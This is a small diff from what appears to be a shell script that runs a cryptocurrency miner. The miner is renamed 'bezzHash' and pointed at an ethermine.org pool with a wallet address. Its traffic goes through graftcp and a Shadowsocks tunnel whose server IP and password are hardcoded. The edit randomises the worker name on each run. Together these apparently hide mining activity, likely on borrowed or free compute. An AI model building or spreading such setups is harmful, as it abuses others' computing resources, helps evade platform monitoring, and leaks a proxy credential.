@@ -59,4 +59,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add bezzHash
 
-./graftcp/graftcp ./bezzHash --url=0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.worker@us1.ethermine.org:4444
+./graftcp/graftcp ./bezzHash --url=0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-9999999 -n 1)-WEWEK)@us1.ethermine.org:4444
